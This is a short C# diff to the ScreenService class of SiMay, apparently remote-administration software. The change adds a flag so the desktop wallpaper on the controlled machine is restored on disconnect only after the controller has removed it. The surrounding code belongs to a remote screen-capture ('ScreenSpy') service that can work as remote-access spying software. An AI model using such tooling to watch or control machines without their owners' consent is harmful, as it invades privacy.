@@ -30,6 +30,7 @@ namespace SiMay.ServiceCore.ApplicationService
     public class ScreenService : ServiceManager, IApplicationService
     {
         private int _bscanmode = 1; //0差异 1逐行
+        private bool _cleanWallPaper = false;
         private static string wallpaper = string.Empty;
         private bool _hasSystemAuthor = AppConfiguartion.HasSystemAuthority.Equals("true", StringComparison.OrdinalIgnoreCase);
         private ScreenSpy _spy;
@@ -48,7 +49,8 @@ namespace SiMay.ServiceCore.ApplicationService
                     this._handlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead<MessageHead>(), this);
                     break;
                 case TcpSocketCompletionNotify.OnClosed:
-                    User32.SystemParametersInfo(User32.SPI_SETDESKWALLPAPER, 0, wallpaper, User32.SPIF_UPDATEINIFILE | User32.SPIF_SENDWININICHANGE);
+                    if (_cleanWallPaper)
+                        User32.SystemParametersInfo(User32.SPI_SETDESKWALLPAPER, 0, wallpaper, User32.SPIF_UPDATEINIFILE | User32.SPIF_SENDWININICHANGE);
                     this._handlerBinder.Dispose();
                     break;
             }
@@ -79,6 +81,7 @@ namespace SiMay.ServiceCore.ApplicationService
         [PacketHandler(MessageHead.S_SCREEN_DELETE_WALLPAPER)]
         public void DeleteWallPaper(TcpSocketSaeaSession session)
         {
+            _cleanWallPaper = true;
             wallpaper = new string('\0', 260);
             User32.SystemParametersInfo(0x73, 260, wallpaper, 0);
             wallpaper = wallpaper.Substring(0, wallpaper.IndexOf('\0'));
